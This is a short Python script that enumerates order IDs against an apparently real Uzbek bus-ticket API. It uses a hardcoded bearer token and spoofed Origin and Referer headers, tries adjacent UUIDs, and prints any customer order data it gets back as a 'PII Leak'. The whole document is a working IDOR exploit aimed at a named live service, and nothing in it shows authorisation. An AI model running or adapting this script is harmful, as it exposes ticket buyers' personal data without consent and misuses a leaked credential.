import requests

base_url = "https://wapi.congresshall.avtotickets.uz/api/order-data?order_id={}"
headers = {
    "Authorization": "Bearer f96d14e8-5a78-419d-b5c9-fc6973499578",
    "Accept": "application/json",
    "User-Agent": "Mozilla/5.0",
    "Origin": "https://avtoticket.uz",
    "Referer": "https://avtoticket.uz/",
}

# Try some nearby UUIDs — you can add more if needed
trial_ids = [
    "7b56edd2-9197-4786-8c0c-df3661430cf6",
    "7b56edd2-9197-4786-8c0c-df3661430cf5",
    "7b56edd2-9197-4786-8c0c-df3661430cf4",
    "7b56edd2-9197-4786-8c0c-df3661430cf3",
]

for trial_id in trial_ids:
    url = base_url.format(trial_id)
    res = requests.get(url, headers=headers)
    print(f"\n[Testing ID] {trial_id}")
    print("Status Code:", res.status_code)
    try:
        data = res.json()
        if res.status_code == 200 and data.get("data"):
            print("🚨 PII Leak Detected!")
            print(data)
            break
        else:
            print("No useful data returned.")
    except Exception as e:
        print("Error decoding response:", e)
